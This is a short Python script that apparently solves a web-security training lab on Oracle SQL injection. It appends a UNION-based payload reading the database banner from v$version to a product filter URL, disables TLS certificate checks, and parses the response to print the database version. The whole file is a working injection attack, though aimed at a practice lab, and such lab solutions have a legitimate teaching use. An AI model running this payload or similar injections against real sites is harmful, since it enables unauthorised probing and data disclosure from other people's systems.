import requests
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "SQL injection attack, querying the database type and version on Oracle"

def run(url, payload=None, proxies=None):
    """
    Executes SQL Injection Lab 3 to extract DB version on Oracle

    Args:
        url (str): Base URL of the lab (no path/query)
        payload (ignored): Not required for this lab
        proxies (dict, optional): Proxy config (e.g., Burp)

    Returns:
        bool: True if Oracle version found, False otherwise
    """
    path = "/filter?category=Gifts"
    sql_payload = "' UNION SELECT banner, NULL from v$version--"
    try:
        r = requests.get(url.rstrip('/') + path + sql_payload, verify=False, proxies=proxies)
        res = r.text
        if "Oracle Database" in res:
            soup = BeautifulSoup(res, 'html.parser')
            version = soup.find(text=re.compile('.*Oracle\sDatabase.*'))
            print(f"[+] The Oracle database version is: {version}")
            return True
        return False
    except Exception as e:
        print(f"[!] Error: {e}")
        return False
